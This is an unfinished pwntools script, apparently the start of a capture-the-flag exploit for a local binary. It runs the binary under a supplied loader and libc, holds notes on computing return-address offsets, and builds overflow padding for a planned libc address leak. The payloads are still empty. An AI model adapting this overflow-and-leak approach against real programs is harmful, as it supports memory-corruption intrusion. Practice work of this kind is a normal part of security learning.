"""
It would be good to have a way to auto identify offsets for the current stack frame
- so how many bytes for RBP + RIP
- also maybe a way to also show the future offsets as well??

- could do some of this statically by just looking and keeping track of rsp? maybe
    would need to know where the char buffer exists

- when given a loader and libc, make sure to always use that, even if your libc and linker works
  - the versions might not only offer correct offsets, but possible bugs from previous versions
"""

import pwn
from time import sleep

def attach_gdb(proc):
  pwn.gdb.attach(proc, gdbscript="""
  fini
  fini
  fini
  fini
  fini
  x/40gx $rsp
  """)
  sleep(1)

def leak_libc_start(proc):
  """ Leaks __libc_start_call_main address by overflowing buffers and then printing
        the buffer + extra characters + libc_start address
      """

  #https://stackoverflow.com/questions/21450860/scanf-doesnt-put-a-terminating-null-byte
  payload = b''
  proc.sendlineafter(b'Hello! What is your name?', payload)
  resp = proc.recvline()
  print(resp) 

def main():
  pwn.context.arch='amd64'
  pwn.context.binary='./lib/ld-2.31.so'
  pwn.context.terminal=['gnome-terminal', '-x', 'sh', '-c']

  proc = pwn.process('./lib/ld-2.31.so --library-path ./lib ./bin/chall')
  #attach_gdb(proc)

  name = b'A' * (0x30)
  country = b'A' * 0x20
  payload = b''.join([
    country

  ])

  leak_libc_start(proc)
  #proc.sendlineafter()

  proc.interactive()



if __name__ == '__main__':
  main()
